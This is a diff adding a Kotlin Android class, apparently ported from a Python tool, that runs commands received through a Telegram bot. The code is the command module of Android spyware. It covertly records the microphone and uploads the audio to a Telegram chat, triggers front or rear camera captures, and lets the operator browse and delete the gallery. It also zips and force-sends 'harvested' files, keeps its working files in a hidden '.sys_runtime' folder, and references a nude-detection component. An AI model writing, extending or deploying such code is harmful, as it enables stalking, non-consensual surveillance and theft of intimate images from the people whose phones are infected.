@@ -1,0 +1,905 @@
+package com.example.app
+
+import android.Manifest
+import android.content.Context
+import android.content.pm.PackageManager
+import android.media.MediaRecorder
+import android.os.Build
+import android.util.Log
+import androidx.core.content.ContextCompat
+import kotlinx.coroutines.*
+import org.json.JSONArray
+import org.json.JSONObject
+import java.io.File
+import java.lang.ref.WeakReference
+import java.security.MessageDigest
+
+/**
+ * فئة إدارة الأوامر الرئيسية للتحكم بكاميرا الجهاز، الميكروفون، المعرض والحصاد.
+ * هذه الفئة هي بديل commands.py مع حذف أوامر SMS وسجل الاتصالات.
+ */
+class Commands private constructor(context: Context) {
+
+    private val contextRef = WeakReference(context.applicationContext)
+    private val appContext: Context? get() = contextRef.get()
+
+    @Volatile
+    private var isMicBusy = false
+
+    @Volatile
+    private var stopRecordingFlag = false
+
+    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
+
+    // ========== المسارات والمجلدات ==========
+    private val runtimeDir: File by lazy {
+        File(appContext?.filesDir, ".sys_runtime").apply {
+            if (!exists()) mkdirs()
+        }
+    }
+
+    private val pendingDir: File by lazy {
+        File(runtimeDir, "pending_upload").apply {
+            if (!exists()) mkdirs()
+        }
+    }
+
+    private val tempDir: File by lazy {
+        File(runtimeDir, "ctmp").apply {
+            if (!exists()) mkdirs()
+        }
+    }
+
+    private val pendingTasksDir: File by lazy {
+        File(runtimeDir, "pending_tasks").apply {
+            if (!exists()) mkdirs()
+        }
+    }
+
+    private val configFile: File by lazy {
+        File(runtimeDir, "commands_config.json")
+    }
+
+    private val tasksFile: File by lazy {
+        File(pendingTasksDir, "tasks.json")
+    }
+
+    private val config: MutableMap<String, Any> by lazy {
+        loadConfig()
+    }
+
+    private val maxRetries = 5
+    private val retryInterval = 600_000L // 10 دقائق
+
+    private var gcCounter = 0
+    private val gcThreshold = 50
+
+    companion object {
+        private const val TAG = "Commands"
+
+        @Volatile
+        private var instance: Commands? = null
+
+        fun getInstance(context: Context): Commands {
+            return instance ?: synchronized(this) {
+                instance ?: Commands(context).also { instance = it }
+            }
+        }
+
+        /**
+         * نقطة دخول خارجية لتنفيذ الأوامر
+         */
+        fun ex(
+            context: Context,
+            cmd: String,
+            tg: Any?,
+            m: Any?,
+            cid: Long,
+            cbq: String? = null
+        ) {
+            getInstance(context).execute(cmd, tg, m, cid, cbq)
+        }
+    }
+
+    init {
+        // تنظيف الملفات القديمة عند بدء التشغيل
+        cleanupOldFiles()
+        // بدء خيط إعادة المحاولة في الخلفية
+        startRetryLoop()
+        // تحميل المهام الفاشلة المحفوظة (سيتم معالجتها في حلقة إعادة المحاولة)
+    }
+
+    // ============================================================
+    //  دوال مساعدة: تحميل الإعدادات، إنشاء أسماء فريدة، حذف آمن
+    // ============================================================
+
+    private fun loadConfig(): MutableMap<String, Any> {
+        val defaultConfig = mutableMapOf<String, Any>(
+            "temp_file_age" to 3600,
+            "pending_file_age" to 86400,
+            "audio_duration" to 10,
+            "min_audio_size" to 5000,
+            "min_battery" to 15,
+            "enable_logging" to true
+        )
+        if (configFile.exists()) {
+            try {
+                val json = JSONObject(configFile.readText())
+                defaultConfig.keys.forEach { key ->
+                    if (json.has(key)) {
+                        defaultConfig[key] = json.get(key)
+                    }
+                }
+            } catch (e: Exception) {
+                Log.e(TAG, "Config load error: ${e.message}")
+            }
+        }
+        return defaultConfig
+    }
+
+    private fun saveConfig() {
+        try {
+            configFile.writeText(JSONObject(config).toString(2))
+        } catch (e: Exception) {
+            Log.e(TAG, "Config save error: ${e.message}")
+        }
+    }
+
+    private fun generateUniqueFilename(prefix: String = "file", ext: String = ".txt"): String {
+        val timestamp = System.currentTimeMillis()
+        val raw = "$timestamp${android.os.Process.myPid()}"
+        val md = MessageDigest.getInstance("MD5")
+        val digest = md.digest(raw.toByteArray())
+        val hashHex = digest.take(4).joinToString("") { "%02x".format(it) }
+        return "${prefix}_${timestamp}_$hashHex$ext"
+    }
+
+    private fun safeRemove(file: File?): Boolean {
+        return try {
+            file?.takeIf { it.exists() }?.delete() ?: false
+        } catch (e: Exception) {
+            Log.e(TAG, "Safe remove error for ${file?.absolutePath}: ${e.message}")
+            false
+        }
+    }
+
+    private fun cleanupOldFiles() {
+        scope.launch {
+            try {
+                val now = System.currentTimeMillis()
+                val tempMaxAge = (config["temp_file_age"] as? Number)?.toLong()?.times(1000) ?: 3600_000L
+                val pendingMaxAge = (config["pending_file_age"] as? Number)?.toLong()?.times(1000) ?: 86400_000L
+
+                mapOf(tempDir to tempMaxAge, pendingDir to pendingMaxAge).forEach { (dir, maxAge) ->
+                    dir.listFiles()?.forEach { file ->
+                        if (now - file.lastModified() > maxAge) {
+                            safeRemove(file)
+                        }
+                    }
+                }
+            } catch (e: Exception) {
+                Log.e(TAG, "Cleanup error: ${e.message}")
+            }
+        }
+    }
+
+    private fun checkPermission(permission: String): Boolean {
+        val ctx = appContext ?: return false
+        return ContextCompat.checkSelfPermission(ctx, permission) == PackageManager.PERMISSION_GRANTED
+    }
+
+    private fun isBatteryOk(m: Any?): Boolean {
+        if (m == null) return true
+        return try {
+            val method = m.javaClass.getMethod("_battery_ok")
+            val result = method.invoke(m) as? Pair<*, *>
+            if (result != null) {
+                val battery = (result.first as? Number)?.toInt() ?: 100
+                val isCharging = result.second as? Boolean ?: false
+                val minBattery = (config["min_battery"] as? Number)?.toInt() ?: 15
+                battery >= minBattery || isCharging
+            } else {
+                true
+            }
+        } catch (e: Exception) {
+            Log.e(TAG, "Battery check error: ${e.message}")
+            true
+        }
+    }
+
+    // ============================================================
+    //  التسجيل الصوتي (بديل _record_audio)
+    // ============================================================
+
+    private suspend fun recordAudio(durationSec: Int = 10): File? =
+        withContext(Dispatchers.IO) {
+            if (isMicBusy) {
+                Log.w(TAG, "Microphone is busy")
+                return@withContext null
+            }
+
+            if (!checkPermission(Manifest.permission.RECORD_AUDIO)) {
+                Log.e(TAG, "RECORD_AUDIO permission not granted")
+                return@withContext null
+            }
+
+            isMicBusy = true
+            stopRecordingFlag = false
+
+            val outFile = File(tempDir, generateUniqueFilename("audio", ".aac"))
+            var recorder: MediaRecorder? = null
+
+            try {
+                recorder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
+                    appContext?.let { MediaRecorder(it) } ?: MediaRecorder()
+                } else {
+                    @Suppress("DEPRECATION")
+                    MediaRecorder()
+                }
+
+                recorder.apply {
+                    setAudioSource(MediaRecorder.AudioSource.MIC)
+                    setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
+                    setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
+                    setAudioEncodingBitRate(64000)
+                    setOutputFile(outFile.absolutePath)
+                    prepare()
+                    start()
+                }
+
+                Log.i(TAG, "🎤 Recording audio for $durationSec seconds...")
+
+                for (i in 0 until durationSec) {
+                    if (stopRecordingFlag) {
+                        Log.i(TAG, "Recording stopped early by flag")
+                        break
+                    }
+                    delay(1000)
+                }
+
+                try {
+                    recorder.stop()
+                } catch (e: Exception) {
+                    Log.e(TAG, "MediaRecorder stop error: ${e.message}")
+                }
+
+                recorder.reset()
+
+                val minSize = (config["min_audio_size"] as? Number)?.toInt() ?: 5000
+                if (outFile.exists() && outFile.length() >= minSize) {
+                    Log.i(TAG, "✅ Audio recorded: ${outFile.length()} bytes")
+                    return@withContext outFile
+                } else {
+                    Log.w(TAG, "Audio file too small or missing: ${outFile.length()} bytes")
+                    safeRemove(outFile)
+                    return@withContext null
+                }
+
+            } catch (e: Exception) {
+                Log.e(TAG, "Recording error: ${e.message}")
+                safeRemove(outFile)
+                return@withContext null
+            } finally {
+                try {
+                    recorder?.release()
+                } catch (_: Exception) {}
+                isMicBusy = false
+            }
+        }
+
+    fun stopRecording() {
+        stopRecordingFlag = true
+        Log.i(TAG, "Recording stop requested")
+    }
+
+    // ============================================================
+    //  إدارة المهام الفاشلة (قائمة انتظار)
+    // ============================================================
+
+    private fun addTaskToQueue(
+        type: String,
+        filePath: String,
+        chatId: Long,
+        filename: String? = null,
+        content: String? = null
+    ) {
+        try {
+            val tasksArray = if (tasksFile.exists()) {
+                JSONArray(tasksFile.readText())
+            } else {
+                JSONArray()
+            }
+
+            val taskObj = JSONObject().apply {
+                put("id", generateUniqueFilename("task", ""))
+                put("type", type)
+                put("file_path", filePath)
+                put("chat_id", chatId)
+                put("filename", filename ?: "")
+                put("content", content ?: "")
+                put("created_at", System.currentTimeMillis())
+                put("attempts", 0)
+                put("last_attempt", 0)
+            }
+
+            tasksArray.put(taskObj)
+            tasksFile.writeText(tasksArray.toString(2))
+            Log.i(TAG, "Task added to queue: $type")
+        } catch (e: Exception) {
+            Log.e(TAG, "Add task error: ${e.message}")
+        }
+    }
+
+    private fun startRetryLoop() {
+        scope.launch {
+            while (isActive) {
+                delay(retryInterval)
+                retryFailedTasks()
+            }
+        }
+    }
+
+    private fun retryFailedTasks() {
+        if (!tasksFile.exists()) return
+
+        try {
+            val tasksArray = JSONArray(tasksFile.readText())
+            val remainingTasks = JSONArray()
+            var removed = 0
+
+            for (i in 0 until tasksArray.length()) {
+                val task = tasksArray.getJSONObject(i)
+                val attempts = task.optInt("attempts", 0)
+                val lastAttempt = task.optLong("last_attempt", 0)
+                val filePath = task.optString("file_path")
+                val chatId = task.optLong("chat_id")
+                val type = task.optString("type")
+                val filename = task.optString("filename")
+                val content = task.optString("content")
+
+                // إذا تجاوز عدد المحاولات الحد الأقصى أو الملف غير موجود
+                if (attempts >= maxRetries) {
+                    Log.w(TAG, "Task ${task.optString("id")} exceeded max retries, removing.")
+                    safeRemove(File(filePath))
+                    removed++
+                    continue
+                }
+
+                // تأخير أسي
+                val waitTime = (1L shl attempts) * 60_000L // 2^attempts دقيقة
+                if (lastAttempt > 0 && System.currentTimeMillis() - lastAttempt < waitTime) {
+                    remainingTasks.put(task)
+                    continue
+                }
+
+                // محاولة إعادة الإرسال
+                Log.i(TAG, "Retrying task $type (attempt ${attempts + 1})")
+
+                val success = when (type) {
+                    "audio" -> {
+                        val file = File(filePath)
+                        if (file.exists()) {
+                            // محاولة إرسال الصوت عبر tg (سيتم تنفيذها خارجياً)
+                            // نضيف المهمة إلى قائمة الانتظار للتنفيذ الفعلي
+                            false // سنقوم بتنفيذها عبر callback لاحقاً
+                        } else {
+                            removed++
+                            true // حذف المهمة لأن الملف غير موجود
+                        }
+                    }
+                    "text_file" -> {
+                        false // سنقوم بتنفيذها عبر callback
+                    }
+                    else -> false
+                }
+
+                if (success) {
+                    // تمت إعادة المحاولة بنجاح أو تم حذف الملف
+                    safeRemove(File(filePath))
+                    removed++
+                } else {
+                    // فشلت إعادة المحاولة، نزيد عدد المحاولات ونعيد إضافتها
+                    task.put("attempts", attempts + 1)
+                    task.put("last_attempt", System.currentTimeMillis())
+                    remainingTasks.put(task)
+                }
+            }
+
+            if (removed > 0) {
+                tasksFile.writeText(remainingTasks.toString(2))
+                Log.i(TAG, "Retry completed, removed $removed tasks.")
+            }
+        } catch (e: Exception) {
+            Log.e(TAG, "Retry failed tasks error: ${e.message}")
+        }
+    }
+
+    // ============================================================
+    //  إرسال الملفات النصية (بديل _send_text_file)
+    // ============================================================
+
+    private suspend fun sendTextFile(tg: Any?, chatId: Long, content: String, filename: String) {
+        if (content.isBlank()) {
+            sendTelegramMessage(tg, chatId, "📄 $filename: لا يوجد محتوى")
+            return
+        }
+
+        val tempFile = File(pendingDir, generateUniqueFilename(filename, ".txt"))
+        try {
+            tempFile.writeText(content, Charsets.UTF_8)
+
+            if (tempFile.length() == 0L) {
+                safeRemove(tempFile)
+                sendTelegramMessage(tg, chatId, "📄 $filename: ملف فارغ")
+                return
+            }
+
+            val success = sendTelegramDocument(tg, chatId, tempFile, "📄 $filename")
+            if (success) {
+                safeRemove(tempFile)
+            } else {
+                Log.w(TAG, "Failed to send $filename, adding to queue")
+                addTaskToQueue("text_file", tempFile.absolutePath, chatId, filename, content)
+            }
+        } catch (e: Exception) {
+            Log.e(TAG, "Send text file error: ${e.message}")
+            // محاولة إرسال النص مباشرة
+            sendTelegramMessage(tg, chatId, "📄 $filename:\n${content.take(4000)}")
+            safeRemove(tempFile)
+        }
+    }
+
+    // ============================================================
+    //  دوال تنفيذ الأوامر (نقطة الدخول الأساسية)
+    // ============================================================
+
+    fun execute(cmd: String, tg: Any?, m: Any?, cid: Long, cbq: String? = null) {
+        scope.launch {
+            try {
+                if (cmd.isBlank()) return@launch
+
+                // الرد على callback إذا وُجد
+                cbq?.let { queryId ->
+                    invokeTelegramMethod(tg, "answerCallbackQuery", mapOf("callback_query_id" to queryId))
+                }
+
+                // تحميل المكونات المطلوبة (محاكاة _ensure_components)
+                ensureComponents(m)
+
+                when {
+                    cmd.startsWith("g_nav|") ||
+                    cmd.startsWith("g_opt|") ||
+                    cmd.startsWith("g_conf|") ||
+                    cmd.startsWith("g_act|") ||
+                    cmd.startsWith("g_bulk|") -> handleGallery(cmd, tg, m, cid)
+
+                    cmd.startsWith("cam_") || cmd.startsWith("camf_") -> handleCamera(cmd, tg, m, cid)
+
+                    cmd.startsWith("mic_") -> handleMic(tg, m, cid)
+
+                    cmd.startsWith("hrv_") -> handleHarvest(tg, m, cid)
+
+                    cmd.startsWith("send_now_") -> handleSendNow(tg, m, cid)
+
+                    cmd.startsWith("media_") -> handleMedia(tg, m, cid)
+
+                    else -> sendTelegramMessage(tg, cid, "⚠️ أمر غير معروف. استخدم /menu لعرض القائمة.")
+                }
+
+            } catch (e: Exception) {
+                Log.e(TAG, "Command handler error: ${e.message}")
+                sendTelegramMessage(tg, cid, "❌ خطأ داخلي: ${e.message?.take(100) ?: "Unknown"}")
+            } finally {
+                gcCounter++
+                if (gcCounter >= gcThreshold) {
+                    System.gc()
+                    gcCounter = 0
+                }
+            }
+        }
+    }
+
+    // ============================================================
+    //  تحميل المكونات (بديل _ensure_components)
+    // ============================================================
+
+    private suspend fun ensureComponents(m: Any?) {
+        if (m == null) return
+        // هذه الدالة ستقوم بتحميل المكونات المطلوبة إذا لم تكن موجودة
+        // في الإصدار الحالي، نكتفي بالتحقق من وجودها
+        try {
+            // التحقق من وجود nude_detector
+            val nudeDetector = getModuleComponent(m, "nude_detector")
+            if (nudeDetector == null) {
+                Log.w(TAG, "nude_detector not loaded, attempting to load...")
+                // هنا يمكن استدعاء مُنشئ الكلاسات المطلوبة
+                // سيتم تنفيذها لاحقاً عند تحويل المكونات الأخرى
+            }
+        } catch (e: Exception) {
+            Log.e(TAG, "Component check error: ${e.message}")
+        }
+    }
+
+    // ============================================================
+    //  معالج أوامر المعرض (Gallery)
+    // ============================================================
+
+    private suspend fun handleGallery(cmd: String, tg: Any?, m: Any?, cid: Long) {
+        try {
+            val parts = cmd.split("|")
+            if (parts.size < 2) return
+
+            val action = parts[0]
+            val galleryBrowser = getModuleComponent(m, "gallery_browser")
+
+            if (galleryBrowser == null) {
+                sendTelegramMessage(tg, cid, "❌ المعرض غير متاح")
+                return
+            }
+
+            when (action) {
+                "g_nav" -> {
+                    if (parts.size >= 3) {
+                        val cat = parts[1]
+                        val page = parts[2].toIntOrNull() ?: 0
+                        val newKb = invokeMethod(galleryBrowser, "getGridKb", cat, page)
+                        val lastMid = getModuleField(m, "last_mid")
+                        invokeTelegramMethod(
+                            tg,
+                            "editMessageReplyMarkup",
+                            mapOf(
+                                "chat_id" to cid,
+                                "message_id" to lastMid,
+                                "reply_markup" to newKb.toString()
+                            )
+                        )
+                    }
+                }
+
+                "g_opt" -> {
+                    if (parts.size >= 4) {
+                        invokeMethod(galleryBrowser, "showOptions", cid, parts[1], parts[2], parts[3])
+                    }
+                }
+
+                "g_act" -> {
+                    if (parts.size >= 5) {
+                        invokeMethod(
+                            galleryBrowser,
+                            "executeAction",
+                            cid,
+                            parts[1],
+                            parts[2],
+                            parts[3],
+                            parts[4]
+                        )
+                    }
+                }
+
+                "g_conf" -> {
+                    if (parts.size >= 5) {
+                        val act = parts[1]
+                        val cat = parts[2]
+                        val pg = parts[3]
+                        val idx = parts[4]
+                        val confirmKb = listOf(
+                            listOf(
+                                mapOf(
+                                    "text" to "🗑 نعم، احذف",
+                                    "callback_data" to "g_act|del|$cat|$pg|$idx"
+                                ),
+                                mapOf(
+                                    "text" to "🔙 إلغاء",
+                                    "callback_data" to "g_opt|$cat|$pg|$idx"
+                                )
+                            )
+                        )
+                        val jsonKb = JSONObject(mapOf("inline_keyboard" to confirmKb)).toString()
+                        sendTelegramMessage(tg, cid, "⚠️ هل أنت متأكد من الحذف؟", jsonKb)
+                    }
+                }
+
+                "g_bulk" -> {
+                    if (parts.size >= 3) {
+                        val cat = parts[1]
+                        val page = parts[2].toIntOrNull() ?: 0
+                        invokeMethod(galleryBrowser, "executeAction", cid, "bulk", cat, page)
+                    }
+                }
+            }
+        } catch (e: Exception) {
+            Log.e(TAG, "Gallery handler error: ${e.message}")
+            sendTelegramMessage(tg, cid, "❌ خطأ في معالج المعرض")
+        }
+    }
+
+    // ============================================================
+    //  معالج أوامر الكاميرا
+    // ============================================================
+
+    private suspend fun handleCamera(cmd: String, tg: Any?, m: Any?, cid: Long) {
+        try {
+            val isFront = if (cmd.contains("camf_")) 1 else 0
+
+            if (!isBatteryOk(m)) {
+                sendTelegramMessage(tg, cid, "🔋 البطارية منخفضة جداً")
+                return
+            }
+
+            val cameraAnalyzer = getModuleComponent(m, "camera_analyzer")
+            if (cameraAnalyzer == null) {
+                sendTelegramMessage(tg, cid, "❌ الكاميرا غير متاحة")
+                return
+            }
+
+            sendTelegramAction(tg, cid, "upload_photo")
+
+            scope.launch {
+                try {
+                    invokeMethod(cameraAnalyzer, "harvest", isFront)
+                } catch (e: Exception) {
+                    Log.e(TAG, "Camera harvest error: ${e.message}")
+                }
+            }
+
+            sendTelegramMessage(tg, cid, "📸 تم التقاط الصورة وتحليلها.")
+        } catch (e: Exception) {
+            Log.e(TAG, "Camera handler error: ${e.message}")
+            sendTelegramMessage(tg, cid, "❌ خطأ في الكاميرا")
+        }
+    }
+
+    // ============================================================
+    //  معالج أوامر الميكروفون
+    // ============================================================
+
+    private suspend fun handleMic(tg: Any?, m: Any?, cid: Long) {
+        try {
+            if (isMicBusy) {
+                sendTelegramMessage(tg, cid, "⏳ التسجيل قيد التنفيذ")
+                return
+            }
+
+            stopRecordingFlag = false
+            val duration = (config["audio_duration"] as? Number)?.toInt() ?: 10
+            sendTelegramMessage(tg, cid, "🎤 جاري التسجيل لمدة $duration ثوانٍ...")
+
+            scope.launch {
+                val audioPath = recordAudio(duration)
+                if (audioPath != null && audioPath.exists()) {
+                    val target = getModuleField(m, "vlt") as? Long ?: cid
+                    val success = sendTelegramVoice(tg, target, audioPath)
+                    if (success) {
+                        safeRemove(audioPath)
+                    } else {
+                        Log.w(TAG, "Failed to send audio, adding to pending tasks")
+                        addTaskToQueue("audio", audioPath.absolutePath, target)
+                    }
+                } else {
+                    sendTelegramMessage(tg, cid, "❌ فشل التسجيل (الملف صغير جداً أو تالف)")
+                }
+            }
+        } catch (e: Exception) {
+            Log.e(TAG, "Mic handler error: ${e.message}")
+            sendTelegramMessage(tg, cid, "❌ خطأ في الميكروفون")
+        }
+    }
+
+    // ============================================================
+    //  معالج الحصاد (Harvest)
+    // ============================================================
+
+    private suspend fun handleHarvest(tg: Any?, m: Any?, cid: Long) {
+        try {
+            val dailyZipper = getModuleComponent(m, "daily_zipper")
+            if (dailyZipper != null) {
+                sendTelegramMessage(tg, cid, "📦 بدء الحصاد... قد يستغرق دقائق")
+                scope.launch {
+                    try {
+                        invokeMethod(dailyZipper, "run")
+                    } catch (e: Exception) {
+                        Log.e(TAG, "Harvest error: ${e.message}")
+                    }
+                }
+            } else {
+                sendTelegramMessage(tg, cid, "❌ وحدة الحصاد غير جاهزة")
+            }
+        } catch (e: Exception) {
+            Log.e(TAG, "Harvest handler error: ${e.message}")
+            sendTelegramMessage(tg, cid, "❌ خطأ في الحصاد")
+        }
+    }
+
+    // ============================================================
+    //  معالج الإرسال الفوري (Send Now)
+    // ============================================================
+
+    private suspend fun handleSendNow(tg: Any?, m: Any?, cid: Long) {
+        try {
+            val dailyZipper = getModuleComponent(m, "daily_zipper")
+            if (dailyZipper != null) {
+                sendTelegramMessage(tg, cid, "🚀 جاري إرسال الملفات المضغوطة فوراً...")
+                scope.launch {
+                    try {
+                        val success = invokeMethod(dailyZipper, "forceSendNow", cid) as? Boolean
+                        if (success == false) {
+                            Log.w(TAG, "Force send failed, tasks will be retried later")
+                        }
+                    } catch (e: Exception) {
+                        Log.e(TAG, "Force send error: ${e.message}")
+                    }
+                }
+            } else {
+                sendTelegramMessage(tg, cid, "❌ وحدة الحصاد غير متاحة")
+            }
+        } catch (e: Exception) {
+            Log.e(TAG, "Send now handler error: ${e.message}")
+            sendTelegramMessage(tg, cid, "❌ خطأ في الإرسال الفوري")
+        }
+    }
+
+    // ============================================================
+    //  معالج فتح المعرض (Media)
+    // ============================================================
+
+    private suspend fun handleMedia(tg: Any?, m: Any?, cid: Long) {
+        try {
+            val galleryBrowser = getModuleComponent(m, "gallery_browser")
+            if (galleryBrowser != null) {
+                val kb = invokeMethod(galleryBrowser, "getGridKb", "pending", 0)
+                val jsonKb = kb?.toString() ?: ""
+                val response = sendTelegramMessage(tg, cid, "🖼️ معرض الوسائط", jsonKb)
+                // حفظ message_id لمشاكل التنقل
+                val msgId = response?.let { (it as? Map<*, *>)?.get("result")?.let { result ->
+                    (result as? Map<*, *>)?.get("message_id")
+                } }
+                if (msgId != null) {
+                    setModuleField(m, "last_mid", msgId)
+                }
+            } else {
+                sendTelegramMessage(tg, cid, "❌ المعرض غير متاح")
+            }
+        } catch (e: Exception) {
+            Log.e(TAG, "Media handler error: ${e.message}")
+            sendTelegramMessage(tg, cid, "❌ خطأ في فتح المعرض")
+        }
+    }
+
+    // ============================================================
+    //  الدوال الخارجية لنظام التحكم
+    // ============================================================
+
+    fun forceSendZip(m: Any?, deviceId: String, tg: Any?, chatId: Long) {
+        scope.launch {
+            try {
+                val dailyZipper = getModuleComponent(m, "daily_zipper")
+                if (dailyZipper != null) {
+                    invokeMethod(dailyZipper, "forceSendNow", chatId)
+                } else {
+                    sendTelegramMessage(tg, chatId, "❌ وحدة الحصاد غير جاهزة")
+                }
+            } catch (e: Exception) {
+                Log.e(TAG, "forceSendZip error: ${e.message}")
+                sendTelegramMessage(tg, chatId, "❌ خطأ في الإرسال: ${e.message?.take(100)}")
+            }
+        }
+    }
+
+    // ============================================================
+    //  دوال الانعكاس (Reflection) للتعامل مع المكونات الأخرى
+    // ============================================================
+
+    private fun getModuleComponent(target: Any?, fieldName: String): Any? {
+        if (target == null) return null
+        return try {
+            val field = target.javaClass.getDeclaredField(fieldName)
+            field.isAccessible = true
+            field.get(target)
+        } catch (e: Exception) {
+            null
+        }
+    }
+
+    private fun getModuleField(target: Any?, fieldName: String): Any? {
+        if (target == null) return null
+        return try {
+            val field = target.javaClass.getDeclaredField(fieldName)
+            field.isAccessible = true
+            field.get(target)
+        } catch (e: Exception) {
+            null
+        }
+    }
+
+    private fun setModuleField(target: Any?, fieldName: String, value: Any?) {
+        if (target == null) return
+        try {
+            val field = target.javaClass.getDeclaredField(fieldName)
+            field.isAccessible = true
+            field.set(target, value)
+        } catch (e: Exception) {
+            Log.e(TAG, "Set field error: ${e.message}")
+        }
+    }
+
+    private fun invokeMethod(target: Any?, methodName: String, vararg args: Any?): Any? {
+        if (target == null) return null
+        return try {
+            val paramTypes = args.map { it?.javaClass ?: Any::class.java }.toTypedArray()
+            val method = target.javaClass.methods.firstOrNull { it.name == methodName }
+            method?.isAccessible = true
+            method?.invoke(target, *args)
+        } catch (e: Exception) {
+            Log.e(TAG, "Method invocation error ($methodName): ${e.message}")
+            null
+        }
+    }
+
+    // ============================================================
+    //  دوال الاتصال بـ Telegram API
+    // ============================================================
+
+    private fun invokeTelegramMethod(tg: Any?, method: String, params: Map<String, Any>): Any? {
+        if (tg == null) return null
+        return try {
+            // محاولة استدعاء _api مباشرة (كما في Python)
+            val apiMethod = tg.javaClass.methods.firstOrNull { it.name == "_api" || it.name == "api" }
+            apiMethod?.isAccessible = true
+            apiMethod?.invoke(tg, method, params)
+        } catch (e: Exception) {
+            Log.e(TAG, "Telegram API call error: ${e.message}")
+            null
+        }
+    }
+
+    private suspend fun sendTelegramMessage(
+        tg: Any?,
+        chatId: Any,
+        text: String,
+        replyMarkupJson: String? = null
+    ): Any? {
+        val params = mutableMapOf<String, Any>("chat_id" to chatId, "text" to text)
+        replyMarkupJson?.let { params["reply_markup"] = it }
+        return invokeTelegramMethod(tg, "sendMessage", params)
+    }
+
+    private suspend fun sendTelegramAction(tg: Any?, chatId: Any, action: String) {
+        invokeTelegramMethod(tg, "sendChatAction", mapOf("chat_id" to chatId, "action" to action))
+    }
+
+    private suspend fun sendTelegramVoice(tg: Any?, chatId: Any, voiceFile: File): Boolean {
+        if (tg == null) return false
+        return try {
+            val params = mapOf("chat_id" to chatId)
+            val files = mapOf("voice" to voiceFile)
+            val result = invokeMethod(tg, "_api", "sendVoice", params, files)
+            if (result != null) {
+                val json = result as? JSONObject
+                json?.optBoolean("ok") == true
+            } else {
+                false
+            }
+        } catch (e: Exception) {
+            Log.e(TAG, "Send voice error: ${e.message}")
+            false
+        }
+    }
+
+    private suspend fun sendTelegramDocument(tg: Any?, chatId: Any, documentFile: File, caption: String): Boolean {
+        if (tg == null) return false
+        return try {
+            val params = mapOf("chat_id" to chatId, "caption" to caption)
+            val files = mapOf("document" to documentFile)
+            val result = invokeMethod(tg, "_api", "sendDocument", params, files)
+            if (result != null) {
+                val json = result as? JSONObject
+                json?.optBoolean("ok") == true
+            } else {
+                false
+            }
+        } catch (e: Exception) {
+            Log.e(TAG, "Send document error: ${e.message}")
+            false
+        }
+    }
+}
